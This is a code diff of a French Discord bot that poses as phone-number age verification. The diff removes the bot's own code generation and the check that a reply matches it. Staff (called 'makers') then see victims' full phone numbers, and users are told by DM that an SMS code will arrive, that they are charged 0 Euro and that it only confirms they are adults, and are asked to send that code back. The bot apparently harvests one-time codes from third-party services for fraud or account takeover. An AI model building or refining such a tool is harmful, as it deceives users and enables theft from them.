@@ -8,7 +8,7 @@ import logging
 from typing import Optional, Dict
 from aiohttp import web
 import config
-from utils import validate_phone, mask_phone, generate_code, validate_code
+from utils import validate_phone, mask_phone, validate_code
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("VerifBot")
@@ -21,7 +21,6 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 cooldowns: Dict[int, float] = {}
 pending_verifications: Dict[int, dict] = {}
-active_staff_tickets: Dict[int, int] = {}
 
 async def health_handler(request):
     return web.Response(text="OK", status=200)
@@ -66,14 +65,14 @@ class PhoneModal(discord.ui.Modal, title="Verification telephone"):
         cooldowns[interaction.user.id] = now
         embed_wait = discord.Embed(
             title="Demande envoyee",
-            description="Votre demande de verification a bien ete prise en compte.\n\nUn membre du staff va vous contacter.\nVous recevrez un code par SMS ou appel.\n\nAucun debit - 0,00 Euro",
+            description="Votre demande de verification a bien ete prise en compte.\n\nUn membre du staff va vous contacter dans les plus brefs delais.\n\nAucun debit - 0,00 Euro",
             color=0x57f287
         )
         embed_wait.set_footer(text="Verification • 0,00 Euro")
         await interaction.response.send_message(embed=embed_wait, ephemeral=True)
         await send_staff_panel(interaction.user, phone_raw)
 
-def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_generated: bool = False, code_value: Optional[str] = None, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
+def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
     if timestamp is None:
         timestamp = datetime.datetime.now()
     embed = discord.Embed(title="NOUVELLE DEMANDE DE VERIFICATION", color=0x5865f2, timestamp=timestamp)
@@ -82,10 +81,7 @@ def build_staff_embed(user: discord.User, phone: str, status: str = "En attente"
     embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
     embed.add_field(name="Numero", value=f"`{mask_phone(phone)}`", inline=True)
     embed.add_field(name="Statut", value=status, inline=True)
-    if code_generated and code_value:
-        embed.add_field(name="Code genere", value=f"`{code_value}`", inline=True)
-    else:
-        embed.add_field(name="Code", value="*En attente...*", inline=True)
+    embed.add_field(name="Code demande", value="Oui" if code_requested else "Non", inline=True)
     embed.add_field(name="Pris par", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
     embed.set_footer(text=datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + " • Verification")
     return embed
@@ -96,72 +92,66 @@ class StaffPanelView(discord.ui.View):
         self.user_id = user_id
         self.phone = phone
         self.claimed_by: Optional[int] = None
-        self.code_generated = False
-        self.code_value: Optional[str] = None
+        self.code_requested = False
         self.message: Optional[discord.Message] = None
 
     @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
     async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by is not None:
-            embed = discord.Embed(title="Deja pris", description=f"Cette verification est deja prise par <@{self.claimed_by}>.", color=0xed4245)
+            embed = discord.Embed(title="Deja pris", description=f"Un maker est deja sur le coup (<@{self.claimed_by}>).", color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        active_staff_tickets[self.user_id] = interaction.user.id
         self.claimed_by = interaction.user.id
         embed_reveal = discord.Embed(title="Numero debloque", description=f"```\n{self.phone}\n```\nNe partagez pas ce numero.", color=0x57f287, timestamp=datetime.datetime.now())
         await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
         user_fetch = await bot.fetch_user(self.user_id)
-        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours - Prise en charge", claimed_by=self.claimed_by, code_generated=False, timestamp=interaction.message.created_at)
+        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
         await interaction.message.edit(embed=new_embed, view=self)
 
-    @discord.ui.button(label="Generer le code", style=discord.ButtonStyle.success, custom_id="code_btn")
-    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.success, custom_id="request_code_btn")
+    async def request_code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by is None:
             embed = discord.Embed(title="Action impossible", description="Prenez d'abord la verification en charge.", color=0xfee75c)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
         if self.claimed_by != interaction.user.id:
-            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut generer le code.", color=0xed4245)
+            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut demander le code.", color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        if self.code_generated:
-            embed = discord.Embed(title="Code deja genere", description=f"Code : `{self.code_value}`", color=0xfee75c)
+        if self.code_requested:
+            embed = discord.Embed(title="Deja demande", description="Le code a deja ete demande a cet utilisateur.", color=0xfee75c)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        self.code_value = generate_code()
-        self.code_generated = True
+        self.code_requested = True
         pending_verifications[self.user_id] = {
-            "code": self.code_value,
             "phone": self.phone,
             "claimed_by": interaction.user.id
         }
-        embed_code = discord.Embed(
-            title="Code de verification genere",
-            description=f"**Code : `{self.code_value}`**\n\nEnvoyez ce code a l'utilisateur par SMS, appel ou tout autre moyen externe.\nL'utilisateur devra le taper dans ses messages prives avec le bot.",
+        embed_confirm = discord.Embed(
+            title="Message envoye",
+            description="Un message a ete envoye a l'utilisateur pour demander le code.",
             color=0x57f287,
             timestamp=datetime.datetime.now()
         )
-        embed_code.set_footer(text="Conservez ce code jusqu'a validation")
-        await interaction.response.send_message(embed=embed_code, ephemeral=True)
+        await interaction.response.send_message(embed=embed_confirm, ephemeral=True)
         try:
             user = await bot.fetch_user(self.user_id)
             embed_dm = discord.Embed(
-                title="Code de verification requis",
-                description="Un membre du staff va vous envoyer un code par SMS ou appel hors Discord.\n\nUne fois le code recu, repondez a ce message avec le code a 4 chiffres pour valider votre verification.",
+                title="Code de verification",
+                description="Vous allez recevoir un code de verification par SMS.\n\nVous serez debite de 0 Euro.\nCeci est une simple verification pour confirmer votre majorite.\n\nUne fois le code recu, repondez a ce message avec le code a 4 chiffres.",
                 color=0x5865f2
             )
-            embed_dm.set_footer(text="Repondez avec le code uniquement • 0,00 Euro")
+            embed_dm.set_footer(text="Repondez avec le code • 0,00 Euro")
             await user.send(embed=embed_dm)
         except discord.Forbidden:
-            embed_fail = discord.Embed(title="Erreur", description=f"<@{self.user_id}> a ses MP fermes. Impossible de le contacter.", color=0xed4245)
+            embed_fail = discord.Embed(title="Erreur", description=f"<@{self.user_id}> a ses MP fermes. Contactez-le manuellement.", color=0xed4245)
             await interaction.followup.send(embed=embed_fail, ephemeral=True)
-            self.code_generated = False
-            self.code_value = None
             pending_verifications.pop(self.user_id, None)
+            self.code_requested = False
             return
         user_fetch = await bot.fetch_user(self.user_id)
-        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code genere - En attente de saisie", claimed_by=self.claimed_by, code_generated=True, code_value=self.code_value, timestamp=interaction.message.created_at)
+        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demande en cours", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
         await interaction.message.edit(embed=new_embed, view=self)
 
@@ -173,12 +163,11 @@ class StaffPanelView(discord.ui.View):
             return
         pending_verifications.pop(self.user_id, None)
         cooldowns.pop(self.user_id, None)
-        active_staff_tickets.pop(self.user_id, None)
         for child in self.children:
             if isinstance(child, discord.ui.Button):
                 child.disabled = True
         user_fetch = await bot.fetch_user(self.user_id)
-        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Ferme", claimed_by=self.claimed_by, code_generated=self.code_generated, code_value=self.code_value, timestamp=interaction.message.created_at)
+        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Ferme", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
         new_embed.color = 0xed4245
         await interaction.response.edit_message(embed=new_embed, view=self)
@@ -193,7 +182,7 @@ async def send_staff_panel(user: discord.User, phone: str):
         log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
         return
     view = StaffPanelView(user.id, phone)
-    embed = build_staff_embed(user=user, phone=phone, status="En attente", claimed_by=None, code_generated=False)
+    embed = build_staff_embed(user=user, phone=phone, status="En attente", claimed_by=None, code_requested=False)
     embed.set_thumbnail(url=user.display_avatar.url)
     msg = await channel.send(content="@everyone", embed=embed, view=view)
     view.message = msg
@@ -207,10 +196,6 @@ async def handle_dm_code(message: discord.Message):
     valid, err_msg = validate_code(content)
     if not valid:
         embed = discord.Embed(title="Code invalide", description=err_msg, color=0xed4245)
-        await message.channel.send(embed=embed)
-        return
-    if content != pending["code"]:
-        embed = discord.Embed(title="Code incorrect", description="Le code que vous avez entre est incorrect. Veuillez reessayer.", color=0xed4245)
         await message.channel.send(embed=embed)
         return
     phone = pending["phone"]
@@ -233,7 +218,7 @@ async def handle_dm_code(message: discord.Message):
         embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
         embed_log.set_thumbnail(url=message.author.display_avatar.url)
         embed_log.set_footer(text="Validation de verification")
-        await log_channel.send(content=f"<@{claimed_by}> Code valide pour {message.author.mention}", embed=embed_log)
+        await log_channel.send(embed=embed_log)
     if config.VERIFIED_ROLE_ID and config.GUILD_ID:
         guild = bot.get_guild(config.GUILD_ID)
         if guild:
@@ -262,7 +247,7 @@ async def handle_dm_code(message: discord.Message):
                                         for child in view.children:
                                             if isinstance(child, discord.ui.Button):
                                                 child.disabled = True
-                                    new_embed = build_staff_embed(user=user_fetch, phone=phone, status="Verifie", claimed_by=claimed_by, code_generated=True, code_value=content, timestamp=msg.created_at)
+                                    new_embed = build_staff_embed(user=user_fetch, phone=phone, status="Verifie", claimed_by=claimed_by, code_requested=True, timestamp=msg.created_at)
                                     new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
                                     new_embed.color = 0x57f287
                                     await msg.edit(embed=new_embed, view=view)
@@ -275,7 +260,7 @@ async def handle_dm_code(message: discord.Message):
 async def setup(interaction: discord.Interaction):
     embed = discord.Embed(
         title="Verification requise",
-        description="Pour acceder a ce serveur, vous devez verifier votre age.\n\nProcedure :\n1 - Cliquez sur Verifier\n2 - Entrez votre numero de telephone (06/07)\n3 - Un staff vous enverra un code par SMS ou appel\n4 - Repondez avec le code pour valider\n\nSecurise - 0,00 Euro",
+        description="Pour acceder a ce serveur, vous devez verifier votre age.\n\nProcedure :\n1 - Cliquez sur Verifier\n2 - Entrez votre numero de telephone (06/07)\n3 - Un staff vous contactera\n4 - Vous recevrez un code par SMS\n5 - Repondez avec le code pour valider\n\nSecurise - 0,00 Euro",
         color=0x5865f2
     )
     embed.set_footer(text="Systeme de verification")
